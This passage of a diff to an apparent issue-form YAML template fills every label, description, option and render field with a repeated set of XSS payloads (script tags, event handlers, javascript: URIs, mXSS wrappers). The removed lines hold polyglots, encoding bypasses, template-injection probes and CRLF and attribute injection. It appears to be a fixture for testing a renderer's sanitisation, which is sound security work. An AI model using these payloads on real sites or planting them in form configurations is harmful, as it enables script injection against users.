+      <style>body{{background:url("javascript:alert(''textarea_value_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("textarea_value_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''textarea_value_7'')">
+
+      <iframe src="javascript:alert(''textarea_value_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''textarea_value_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''textarea_value_10'')">
+
+      <object data="javascript:alert(''textarea_value_11'')">
+
+      <base href="javascript:alert(''textarea_value_12'')//">
+
+      <body onload=alert("textarea_value_13")>
+
+      <video><source onerror=alert("textarea_value_14")>
+
+      <audio src=x onerror=alert("textarea_value_15")>
+
+      <marquee onstart=alert("textarea_value_16")>
+
+      <meter onmouseover=alert("textarea_value_17")>0</meter>
+
+      <details open ontoggle=alert("textarea_value_18")>
+
+      <input onfocus=alert("textarea_value_19") autofocus>
+
+      <select onfocus=alert("textarea_value_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("textarea_value_21") autofocus>
+
+      <keygen onfocus=alert("textarea_value_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''textarea_value_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("textarea_value_24")></xmp>
+
+      <noscript><img src=x onerror=alert("textarea_value_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("textarea_value_26")&gt;</listing>'
+  validations:
+    required: true
+- type: dropdown
+  id: version
+  attributes:
+    label: '<script>alert("dropdown_label_0")</script>
+
+      <img src=x onerror=alert("dropdown_label_1")>
+
+      <svg onload=alert("dropdown_label_2")>
+
+      <svg/onload=alert("dropdown_label_3")>
+
+      <style>@import"javascript:alert(''dropdown_label_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''dropdown_label_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("dropdown_label_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''dropdown_label_7'')">
+
+      <iframe src="javascript:alert(''dropdown_label_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''dropdown_label_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''dropdown_label_10'')">
+
+      <object data="javascript:alert(''dropdown_label_11'')">
+
+      <base href="javascript:alert(''dropdown_label_12'')//">
+
+      <body onload=alert("dropdown_label_13")>
+
+      <video><source onerror=alert("dropdown_label_14")>
+
+      <audio src=x onerror=alert("dropdown_label_15")>
+
+      <marquee onstart=alert("dropdown_label_16")>
+
+      <meter onmouseover=alert("dropdown_label_17")>0</meter>
+
+      <details open ontoggle=alert("dropdown_label_18")>
+
+      <input onfocus=alert("dropdown_label_19") autofocus>
+
+      <select onfocus=alert("dropdown_label_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("dropdown_label_21") autofocus>
+
+      <keygen onfocus=alert("dropdown_label_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''dropdown_label_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("dropdown_label_24")></xmp>
+
+      <noscript><img src=x onerror=alert("dropdown_label_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("dropdown_label_26")&gt;</listing>'
+    description: '<script>alert("dropdown_description_0")</script>
+
+      <img src=x onerror=alert("dropdown_description_1")>
+
+      <svg onload=alert("dropdown_description_2")>
+
+      <svg/onload=alert("dropdown_description_3")>
+
+      <style>@import"javascript:alert(''dropdown_description_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''dropdown_description_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("dropdown_description_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''dropdown_description_7'')">
+
+      <iframe src="javascript:alert(''dropdown_description_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''dropdown_description_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''dropdown_description_10'')">
+
+      <object data="javascript:alert(''dropdown_description_11'')">
+
+      <base href="javascript:alert(''dropdown_description_12'')//">
+
+      <body onload=alert("dropdown_description_13")>
+
+      <video><source onerror=alert("dropdown_description_14")>
+
+      <audio src=x onerror=alert("dropdown_description_15")>
+
+      <marquee onstart=alert("dropdown_description_16")>
+
+      <meter onmouseover=alert("dropdown_description_17")>0</meter>
+
+      <details open ontoggle=alert("dropdown_description_18")>
+
+      <input onfocus=alert("dropdown_description_19") autofocus>
+
+      <select onfocus=alert("dropdown_description_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("dropdown_description_21") autofocus>
+
+      <keygen onfocus=alert("dropdown_description_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''dropdown_description_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("dropdown_description_24")></xmp>
+
+      <noscript><img src=x onerror=alert("dropdown_description_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("dropdown_description_26")&gt;</listing>'
+    options:
+    - '<script>alert("dropdown_option_0_0")</script>
+
+      <img src=x onerror=alert("dropdown_option_0_1")>
+
+      <svg onload=alert("dropdown_option_0_2")>
+
+      <svg/onload=alert("dropdown_option_0_3")>
+
+      <style>@import"javascript:alert(''dropdown_option_0_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''dropdown_option_0_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("dropdown_option_0_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''dropdown_option_0_7'')">
+
+      <iframe src="javascript:alert(''dropdown_option_0_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''dropdown_option_0_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''dropdown_option_0_10'')">
+
+      <object data="javascript:alert(''dropdown_option_0_11'')">
+
+      <base href="javascript:alert(''dropdown_option_0_12'')//">
+
+      <body onload=alert("dropdown_option_0_13")>
+
+      <video><source onerror=alert("dropdown_option_0_14")>
+
+      <audio src=x onerror=alert("dropdown_option_0_15")>
+
+      <marquee onstart=alert("dropdown_option_0_16")>
+
+      <meter onmouseover=alert("dropdown_option_0_17")>0</meter>
+
+      <details open ontoggle=alert("dropdown_option_0_18")>
+
+      <input onfocus=alert("dropdown_option_0_19") autofocus>
+
+      <select onfocus=alert("dropdown_option_0_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("dropdown_option_0_21") autofocus>
+
+      <keygen onfocus=alert("dropdown_option_0_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''dropdown_option_0_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("dropdown_option_0_24")></xmp>
+
+      <noscript><img src=x onerror=alert("dropdown_option_0_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("dropdown_option_0_26")&gt;</listing>'
+    - 1.0.3 (Edge)
+    default: 0
+  validations:
+    required: true
+- type: dropdown
+  id: browsers
+  attributes:
+    label: '<script>alert("dropdown_multi_label_0")</script>
+
+      <img src=x onerror=alert("dropdown_multi_label_1")>
+
+      <svg onload=alert("dropdown_multi_label_2")>
+
+      <svg/onload=alert("dropdown_multi_label_3")>
+
+      <style>@import"javascript:alert(''dropdown_multi_label_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''dropdown_multi_label_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("dropdown_multi_label_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''dropdown_multi_label_7'')">
+
+      <iframe src="javascript:alert(''dropdown_multi_label_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''dropdown_multi_label_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''dropdown_multi_label_10'')">
+
+      <object data="javascript:alert(''dropdown_multi_label_11'')">
+
+      <base href="javascript:alert(''dropdown_multi_label_12'')//">
+
+      <body onload=alert("dropdown_multi_label_13")>
+
+      <video><source onerror=alert("dropdown_multi_label_14")>
+
+      <audio src=x onerror=alert("dropdown_multi_label_15")>
+
+      <marquee onstart=alert("dropdown_multi_label_16")>
+
+      <meter onmouseover=alert("dropdown_multi_label_17")>0</meter>
+
+      <details open ontoggle=alert("dropdown_multi_label_18")>
+
+      <input onfocus=alert("dropdown_multi_label_19") autofocus>
+
+      <select onfocus=alert("dropdown_multi_label_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("dropdown_multi_label_21") autofocus>
+
+      <keygen onfocus=alert("dropdown_multi_label_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''dropdown_multi_label_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("dropdown_multi_label_24")></xmp>
+
+      <noscript><img src=x onerror=alert("dropdown_multi_label_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("dropdown_multi_label_26")&gt;</listing>'
+    multiple: true
+    options:
+    - '<script>alert("dropdown_multi_option_0_0")</script>
+
+      <img src=x onerror=alert("dropdown_multi_option_0_1")>
+
+      <svg onload=alert("dropdown_multi_option_0_2")>
+
+      <svg/onload=alert("dropdown_multi_option_0_3")>
+
+      <style>@import"javascript:alert(''dropdown_multi_option_0_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''dropdown_multi_option_0_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("dropdown_multi_option_0_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''dropdown_multi_option_0_7'')">
+
+      <iframe src="javascript:alert(''dropdown_multi_option_0_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''dropdown_multi_option_0_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''dropdown_multi_option_0_10'')">
+
+      <object data="javascript:alert(''dropdown_multi_option_0_11'')">
+
+      <base href="javascript:alert(''dropdown_multi_option_0_12'')//">
+
+      <body onload=alert("dropdown_multi_option_0_13")>
+
+      <video><source onerror=alert("dropdown_multi_option_0_14")>
+
+      <audio src=x onerror=alert("dropdown_multi_option_0_15")>
+
+      <marquee onstart=alert("dropdown_multi_option_0_16")>
+
+      <meter onmouseover=alert("dropdown_multi_option_0_17")>0</meter>
+
+      <details open ontoggle=alert("dropdown_multi_option_0_18")>
+
+      <input onfocus=alert("dropdown_multi_option_0_19") autofocus>
+
+      <select onfocus=alert("dropdown_multi_option_0_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("dropdown_multi_option_0_21") autofocus>
+
+      <keygen onfocus=alert("dropdown_multi_option_0_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''dropdown_multi_option_0_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("dropdown_multi_option_0_24")></xmp>
+
+      <noscript><img src=x onerror=alert("dropdown_multi_option_0_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("dropdown_multi_option_0_26")&gt;</listing>'
+    - Chrome
+    - Safari
+    - Microsoft Edge
+- type: textarea
+  id: logs
+  attributes:
+    label: '<script>alert("textarea_render_label_0")</script>
+
+      <img src=x onerror=alert("textarea_render_label_1")>
+
+      <svg onload=alert("textarea_render_label_2")>
+
+      <svg/onload=alert("textarea_render_label_3")>
+
+      <style>@import"javascript:alert(''textarea_render_label_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''textarea_render_label_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("textarea_render_label_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''textarea_render_label_7'')">
+
+      <iframe src="javascript:alert(''textarea_render_label_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''textarea_render_label_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''textarea_render_label_10'')">
+
+      <object data="javascript:alert(''textarea_render_label_11'')">
+
+      <base href="javascript:alert(''textarea_render_label_12'')//">
+
+      <body onload=alert("textarea_render_label_13")>
+
+      <video><source onerror=alert("textarea_render_label_14")>
+
+      <audio src=x onerror=alert("textarea_render_label_15")>
+
+      <marquee onstart=alert("textarea_render_label_16")>
+
+      <meter onmouseover=alert("textarea_render_label_17")>0</meter>
+
+      <details open ontoggle=alert("textarea_render_label_18")>
+
+      <input onfocus=alert("textarea_render_label_19") autofocus>
+
+      <select onfocus=alert("textarea_render_label_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("textarea_render_label_21") autofocus>
+
+      <keygen onfocus=alert("textarea_render_label_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''textarea_render_label_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("textarea_render_label_24")></xmp>
+
+      <noscript><img src=x onerror=alert("textarea_render_label_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("textarea_render_label_26")&gt;</listing>'
+    description: '<script>alert("textarea_render_desc_0")</script>
+
+      <img src=x onerror=alert("textarea_render_desc_1")>
+
+      <svg onload=alert("textarea_render_desc_2")>
+
+      <svg/onload=alert("textarea_render_desc_3")>
+
+      <style>@import"javascript:alert(''textarea_render_desc_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''textarea_render_desc_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("textarea_render_desc_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''textarea_render_desc_7'')">
+
+      <iframe src="javascript:alert(''textarea_render_desc_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''textarea_render_desc_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''textarea_render_desc_10'')">
+
+      <object data="javascript:alert(''textarea_render_desc_11'')">
+
+      <base href="javascript:alert(''textarea_render_desc_12'')//">
+
+      <body onload=alert("textarea_render_desc_13")>
+
+      <video><source onerror=alert("textarea_render_desc_14")>
+
+      <audio src=x onerror=alert("textarea_render_desc_15")>
+
+      <marquee onstart=alert("textarea_render_desc_16")>
+
+      <meter onmouseover=alert("textarea_render_desc_17")>0</meter>
+
+      <details open ontoggle=alert("textarea_render_desc_18")>
+
+      <input onfocus=alert("textarea_render_desc_19") autofocus>
+
+      <select onfocus=alert("textarea_render_desc_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("textarea_render_desc_21") autofocus>
+
+      <keygen onfocus=alert("textarea_render_desc_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''textarea_render_desc_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("textarea_render_desc_24")></xmp>
+
+      <noscript><img src=x onerror=alert("textarea_render_desc_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("textarea_render_desc_26")&gt;</listing>'
+    render: '<script>alert("textarea_render_0")</script>
+
+      <img src=x onerror=alert("textarea_render_1")>
+
+      <svg onload=alert("textarea_render_2")>
+
+      <svg/onload=alert("textarea_render_3")>
+
+      <style>@import"javascript:alert(''textarea_render_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''textarea_render_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("textarea_render_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''textarea_render_7'')">
+
+      <iframe src="javascript:alert(''textarea_render_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''textarea_render_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''textarea_render_10'')">
+
+      <object data="javascript:alert(''textarea_render_11'')">
+
+      <base href="javascript:alert(''textarea_render_12'')//">
+
+      <body onload=alert("textarea_render_13")>
+
+      <video><source onerror=alert("textarea_render_14")>
+
+      <audio src=x onerror=alert("textarea_render_15")>
+
+      <marquee onstart=alert("textarea_render_16")>
+
+      <meter onmouseover=alert("textarea_render_17")>0</meter>
+
+      <details open ontoggle=alert("textarea_render_18")>
+
+      <input onfocus=alert("textarea_render_19") autofocus>
+
+      <select onfocus=alert("textarea_render_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("textarea_render_21") autofocus>
+
+      <keygen onfocus=alert("textarea_render_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''textarea_render_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("textarea_render_24")></xmp>
+
+      <noscript><img src=x onerror=alert("textarea_render_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("textarea_render_26")&gt;</listing>'
+- type: checkboxes
+  id: terms
+  attributes:
+    label: '<script>alert("checkboxes_label_0")</script>
+
+      <img src=x onerror=alert("checkboxes_label_1")>
+
+      <svg onload=alert("checkboxes_label_2")>
+
+      <svg/onload=alert("checkboxes_label_3")>
+
+      <style>@import"javascript:alert(''checkboxes_label_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''checkboxes_label_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("checkboxes_label_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''checkboxes_label_7'')">
+
+      <iframe src="javascript:alert(''checkboxes_label_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''checkboxes_label_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''checkboxes_label_10'')">
+
+      <object data="javascript:alert(''checkboxes_label_11'')">
+
+      <base href="javascript:alert(''checkboxes_label_12'')//">
+
+      <body onload=alert("checkboxes_label_13")>
+
+      <video><source onerror=alert("checkboxes_label_14")>
+
+      <audio src=x onerror=alert("checkboxes_label_15")>
+
+      <marquee onstart=alert("checkboxes_label_16")>
+
+      <meter onmouseover=alert("checkboxes_label_17")>0</meter>
+
+      <details open ontoggle=alert("checkboxes_label_18")>
+
+      <input onfocus=alert("checkboxes_label_19") autofocus>
+
+      <select onfocus=alert("checkboxes_label_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("checkboxes_label_21") autofocus>
+
+      <keygen onfocus=alert("checkboxes_label_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''checkboxes_label_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("checkboxes_label_24")></xmp>
+
+      <noscript><img src=x onerror=alert("checkboxes_label_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("checkboxes_label_26")&gt;</listing>'
+    description: '<script>alert("checkboxes_description_0")</script>
+
+      <img src=x onerror=alert("checkboxes_description_1")>
+
+      <svg onload=alert("checkboxes_description_2")>
+
+      <svg/onload=alert("checkboxes_description_3")>
+
+      <style>@import"javascript:alert(''checkboxes_description_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''checkboxes_description_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("checkboxes_description_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''checkboxes_description_7'')">
+
+      <iframe src="javascript:alert(''checkboxes_description_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''checkboxes_description_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''checkboxes_description_10'')">
+
+      <object data="javascript:alert(''checkboxes_description_11'')">
+
+      <base href="javascript:alert(''checkboxes_description_12'')//">
+
+      <body onload=alert("checkboxes_description_13")>
+
+      <video><source onerror=alert("checkboxes_description_14")>
+
+      <audio src=x onerror=alert("checkboxes_description_15")>
+
+      <marquee onstart=alert("checkboxes_description_16")>
+
+      <meter onmouseover=alert("checkboxes_description_17")>0</meter>
+
+      <details open ontoggle=alert("checkboxes_description_18")>
+
+      <input onfocus=alert("checkboxes_description_19") autofocus>
+
+      <select onfocus=alert("checkboxes_description_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("checkboxes_description_21") autofocus>
+
+      <keygen onfocus=alert("checkboxes_description_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''checkboxes_description_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("checkboxes_description_24")></xmp>
+
+      <noscript><img src=x onerror=alert("checkboxes_description_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("checkboxes_description_26")&gt;</listing>'
+    options:
+    - label: '<script>alert("checkbox_option_label_0_0")</script>
+
+        <img src=x onerror=alert("checkbox_option_label_0_1")>
+
+        <svg onload=alert("checkbox_option_label_0_2")>
+
+        <svg/onload=alert("checkbox_option_label_0_3")>
+
+        <style>@import"javascript:alert(''checkbox_option_label_0_4'')"</style>
+
+        <style>body{{background:url("javascript:alert(''checkbox_option_label_0_5'')")}}</style>
+
+        <style>*{{xss:expression(alert("checkbox_option_label_0_6"))}}</style>
+
+        <link rel=stylesheet href="javascript:alert(''checkbox_option_label_0_7'')">
+
+        <iframe src="javascript:alert(''checkbox_option_label_0_8'')"></iframe>
+
+        <iframe srcdoc="<script>alert(''checkbox_option_label_0_9'')</script>"></iframe>
+
+        <embed src="javascript:alert(''checkbox_option_label_0_10'')">
+
+        <object data="javascript:alert(''checkbox_option_label_0_11'')">
+
+        <base href="javascript:alert(''checkbox_option_label_0_12'')//">
+
+        <body onload=alert("checkbox_option_label_0_13")>
+
+        <video><source onerror=alert("checkbox_option_label_0_14")>
+
+        <audio src=x onerror=alert("checkbox_option_label_0_15")>
+
+        <marquee onstart=alert("checkbox_option_label_0_16")>
+
+        <meter onmouseover=alert("checkbox_option_label_0_17")>0</meter>
+
+        <details open ontoggle=alert("checkbox_option_label_0_18")>
+
+        <input onfocus=alert("checkbox_option_label_0_19") autofocus>
+
+        <select onfocus=alert("checkbox_option_label_0_20") autofocus><option>x</option></select>
+
+        <textarea onfocus=alert("checkbox_option_label_0_21") autofocus>
+
+        <keygen onfocus=alert("checkbox_option_label_0_22") autofocus>
+
+        <math><mi xlink:href="javascript:alert(''checkbox_option_label_0_23'')">click</mi></math>
+
+        <xmp><img src=x onerror=alert("checkbox_option_label_0_24")></xmp>
+
+        <noscript><img src=x onerror=alert("checkbox_option_label_0_25")></noscript>
+
+        <listing>&lt;img src=x onerror=alert("checkbox_option_label_0_26")&gt;</listing>'
       required: true
+- type: upload
+  id: screenshots
+  attributes:
+    label: '<script>alert("upload_label_0")</script>
 
-  # 4. Textarea with render - XSS in render field
-  - type: textarea
-    id: logs
-    attributes:
-      label: "Relevant log output <img src=x onerror=alert('logs_label')>"
-      description: "Please paste log output <img src=x onerror=alert('logs_desc')>"
-      render: "shell\"><img src=x onerror=alert('logs_render')>"
+      <img src=x onerror=alert("upload_label_1")>
 
-  # 5. Dropdown - XSS in label, description, options
-  - type: dropdown
-    id: version
-    attributes:
-      label: "Version <img src=x onerror=alert('dropdown_label')>"
-      description: "What version? <script>alert('dropdown_desc')</script> <img src=x onerror=alert('dropdown_desc_img')>"
-      options:
-        - "1.0.2 (Default)"
-        - "1.0.3 <img src=x onerror=alert('dropdown_option')>"
-        - "<script>alert('dropdown_option_script')</script>"
-        - "<svg onload=alert('dropdown_option_svg')>"
-        - "test\"><img src=x onerror=alert('dropdown_option_break')>"
-        - "&lt;img src=x onerror=alert('dropdown_option_entity')&gt;"
-        - "<a href=javascript:alert('dropdown_option_link')>click</a>"
-      default: 0
-    validations:
-      required: true
+      <svg onload=alert("upload_label_2")>
 
-  # 6. Dropdown multiple - XSS in options
-  - type: dropdown
-    id: browsers
-    attributes:
-      label: "Browsers <img src=x onerror=alert('dropdown2_label')>"
-      multiple: true
-      options:
-        - "Firefox <img src=x onerror=alert('browser_option1')>"
-        - "Chrome<script>alert('browser_option2')</script>"
-        - "<svg onload=alert('browser_option3')>Safari"
-        - "Edge\"><img src=x onerror=alert('browser_option4')>"
+      <svg/onload=alert("upload_label_3")>
 
-  # 7. Checkboxes - XSS in label, description, option labels (markdown supported)
-  - type: checkboxes
-    id: terms
-    attributes:
-      label: "Code of Conduct <img src=x onerror=alert('checkbox_label')>"
-      description: "By submitting this issue <script>alert('checkbox_desc')</script> <img src=x onerror=alert('checkbox_desc_img')>"
-      options:
-        - label: "I agree to follow this project's [Code of Conduct](javascript:alert('checkbox_option_md_link'))"
-          required: true
-        - label: "<img src=x onerror=alert('checkbox_option_img')>"
-          required: false
-        - label: "<script>alert('checkbox_option_script')</script>"
-          required: false
-        - label: "<svg onload=alert('checkbox_option_svg')>"
-          required: false
-        - label: "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnY2hlY2tib3hfYjY0Jyk8L3NjcmlwdD4=)"
-          required: false
-        - label: "test &lt;img src=x onerror=alert('checkbox_option_entity')&gt;"
-          required: false
-        - label: "![img](javascript:alert('checkbox_option_md_img'))"
-          required: false
+      <style>@import"javascript:alert(''upload_label_4'')"</style>
 
-  # 8. Upload - XSS in label, description
-  - type: upload
-    id: screenshots
-    attributes:
-      label: "Upload screenshots <img src=x onerror=alert('upload_label')> <script>alert('upload_label2')</script>"
-      description: "Add screenshots <img src=x onerror=alert('upload_desc')> <svg onload=alert('upload_desc_svg')> [click](javascript:alert('upload_desc_md'))"
-    validations:
-      required: false
+      <style>body{{background:url("javascript:alert(''upload_label_5'')")}}</style>
 
-  # 9. Extra markdown block - encoding & edge case payloads
-  - type: markdown
-    attributes:
-      value: |
-        <!-- XSS via HTML comment edge cases -->
-        <!--><img src=x onerror=alert('comment_bypass')>-->
-        <comment><img src=x onerror=alert('fake_comment')></comment>
+      <style>*{{xss:expression(alert("upload_label_6"))}}</style>
 
-        <!-- Null byte injection -->
-        <img src=x onerror=alert('null_byte')>
-        <scr\x00ipt>alert('null_in_tag')</scr\x00ipt>
+      <link rel=stylesheet href="javascript:alert(''upload_label_7'')">
 
-        <!-- Double encoding -->
-        %253Cscript%253Ealert('double_encode')%253C/script%253E
-        %3Cimg%20src%3Dx%20onerror%3Dalert('url_encode')%3E
+      <iframe src="javascript:alert(''upload_label_8'')"></iframe>
 
-        <!-- Unicode tricks -->
-        <img src=x onerror=\u0061\u006C\u0065\u0072\u0074('unicode_escape')>
-        ＜script＞alert('fullwidth_tags')＜/script＞
-        <img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;('hex_char_ref')>
-        <img src=x onerror=&#97;&#108;&#101;&#114;&#116;('dec_char_ref')>
+      <iframe srcdoc="<script>alert(''upload_label_9'')</script>"></iframe>
 
-        <!-- Mutation XSS (mXSS) -->
-        <listing>&lt;img src=x onerror=alert('mxss_listing')&gt;</listing>
-        <noscript><img src=x onerror=alert('mxss_noscript')></noscript>
-        <style><img src=x onerror=alert('mxss_style')></style>
-        <xmp><img src=x onerror=alert('mxss_xmp')></xmp>
+      <embed src="javascript:alert(''upload_label_10'')">
 
-        <!-- Protocol handlers -->
-        <a href="tel:1234567890">tel link</a>
-        <a href="mailto:x@x.com?subject=<img src=x onerror=alert('mailto_xss')>">mail</a>
-        <a href="feed:javascript:alert('feed_proto')">feed</a>
+      <object data="javascript:alert(''upload_label_11'')">
 
-        <!-- SVG-specific payloads -->
-        <svg><animate onbegin=alert('svg_animate') attributeName=x dur=1s>
-        <svg><set onbegin=alert('svg_set') attributeName=x to=1>
-        <svg><script>alert('svg_script')</script></svg>
-        <svg><foreignObject><body onload=alert('svg_foreign')></foreignObject></svg>
-        <svg><use href="data:image/svg+xml,<svg onload=alert('svg_use')>"></use></svg>
+      <base href="javascript:alert(''upload_label_12'')//">
 
-        <!-- Template/framework injection -->
-        {{7*7}}
-        ${7*7}
-        #{7*7}
-        {{constructor.constructor('alert("ssti")')()}}
-        <%= `alert('erb')` %>
-        ${{<%[%'"}}%\
+      <body onload=alert("upload_label_13")>
 
-        <!-- CRLF / header injection in value -->
-        test\r\nContent-Type: text/html\r\n\r\n<script>alert('crlf')</script>
+      <video><source onerror=alert("upload_label_14")>
 
-  # 10. Extra input - attribute injection via id field
-  - type: input
-    id: "contact2\" onfocus=\"alert('id_injection')"
-    attributes:
-      label: "Secondary Contact"
-      description: "Backup contact info"
-      placeholder: "ex. phone"
-    validations:
-      required: false
+      <audio src=x onerror=alert("upload_label_15")>
 
-  # 11. Textarea - polyglot payload
-  - type: textarea
-    id: polyglot
-    attributes:
-      label: "Additional context"
-      description: "Any other context about the problem"
-      value: |
-        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik%telerikD%telerikA%telerikD%0telerika%0D%0AoN%telerikcliCk=alert()//</stYle/telerik</teleriktiTle/</telerikteXtarEa/</tele
-        rikscRipt/--!>\x3csVg/<telerisVg/oNloAd=alert()//>\x3e
+      <marquee onstart=alert("upload_label_16")>
 
-        '">><marquee><img src=x onerror=alert('polyglot2')>//<details/open/ontoggle=confirm('polyglot3')>
+      <meter onmouseover=alert("upload_label_17")>0</meter>
 
-        javascript:alert('proto1')
-        &#0000106avascript:alert('proto2')
-        \x6Aavascript:alert('proto3')
-        data:text/html,<script>alert('proto4')</script>
-        vbscript:alert('proto5')
+      <details open ontoggle=alert("upload_label_18")>
 
-  # 12. Checkboxes with markdown link edge cases
-  - type: checkboxes
-    id: extra-checks
-    attributes:
-      label: "Extra agreements"
-      options:
-        - label: "I read the [terms](https://example.com\" onclick=\"alert('checkbox_attr_inject'))"
-          required: false
-        - label: "I read the [terms](https://example.com)<img src=x onerror=alert('checkbox_after_link')>"
-          required: false
-        - label: "I accept [<img src=x onerror=alert('checkbox_img_in_link')>](https://example.com)"
-          required: false
+      <input onfocus=alert("upload_label_19") autofocus>
+
+      <select onfocus=alert("upload_label_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("upload_label_21") autofocus>
+
+      <keygen onfocus=alert("upload_label_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''upload_label_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("upload_label_24")></xmp>
+
+      <noscript><img src=x onerror=alert("upload_label_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("upload_label_26")&gt;</listing>'
+    description: '<script>alert("upload_description_0")</script>
+
+      <img src=x onerror=alert("upload_description_1")>
+
+      <svg onload=alert("upload_description_2")>
+
+      <svg/onload=alert("upload_description_3")>
+
+      <style>@import"javascript:alert(''upload_description_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''upload_description_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("upload_description_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''upload_description_7'')">
+
+      <iframe src="javascript:alert(''upload_description_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''upload_description_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''upload_description_10'')">
+
+      <object data="javascript:alert(''upload_description_11'')">
+
+      <base href="javascript:alert(''upload_description_12'')//">
+
